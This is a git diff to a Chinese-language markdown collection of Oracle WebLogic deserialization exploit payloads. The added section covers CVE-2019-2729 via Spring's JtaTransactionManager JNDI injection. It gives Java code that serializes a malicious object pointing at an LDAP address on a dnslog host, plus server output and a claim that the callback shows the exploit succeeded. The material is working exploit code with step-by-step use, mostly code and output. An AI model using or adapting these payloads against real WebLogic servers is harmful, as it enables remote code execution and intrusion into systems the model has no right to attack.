@@ -122,13 +122,43 @@ with open(out_file, 'w') as f:
     f.write(exp)
 ```
 
-
 ### CVE-2019-2729_v10_UnitOfWorkChangeSet_with_echo
 
 带回显的payload：
 来源：
 - https://github.com/starnightcyber/VEF/blob/ebbdeed2556d56fd0a59796f72c8643f277a5151/scripts/weblogic-cve-2019-2729.py
 
+
+### CVE-2019-2729_v10_UnitOfWorkChangeSet_JtaTransactionManager
+利用`CVE-2018-3191`的原理，即利用`com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager`完成jndi注入。条件：依赖出网。
+依赖jar包：
+- modules/com.bea.core.repackaged.springframework.spring_1.2.0.0_2-5-3.jar
+- modules/com.bea.core.repackaged.apache.commons.logging_1.2.1.jar
+
+生成恶意object代码：
+```java
+import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
+
+    static void genSpringJdniPayload() throws Exception{
+        String jdniAddr = "ldap://5272d7b33d98259d5e61.d.zhack.ca/LoadObject";
+        JtaTransactionManager object = new JtaTransactionManager();
+        object.setUserTransactionName(jdniAddr);
+        File f = new File("C:\\Users\\Administrator\\Desktop\\SpringJdniPayload.ser");
+        ObjectOutputStream out2 = new ObjectOutputStream(new FileOutputStream(f));
+        out2.writeObject(object);
+        out2.flush();
+        out2.close();
+    }
+```
+使用之前的py脚本生成payload。
+
+weblogic控制台输出：
+```
+com.bea.core.repackaged.springframework.transaction.TransactionSystemException: JTA UserTransaction is not available at JNDI location [ldap://5272d7b33d98259d5e61.d.zhack.ca/LoadObject]; nested exception is javax.naming.CommunicationException: 5272d7b33d98259d5e61.d.zhack.ca:389 [Root exception is java.net.ConnectException: Connection refused: connect]
+```
+dnslog平台收到请求，说明利用成功。
+参考：
+- https://github.com/mackleadmire/CVE-2018-3191-Rce-Exploit/blob/master/src/GenSpringJdniPayload.java
 
 ### CVE-2019-2725_v12_EventData_double_xml
 利用`org.slf4j.ext.EventData`进行二次xml反序列化。`org.slf4j.ext.EventData`只存在于v12中。
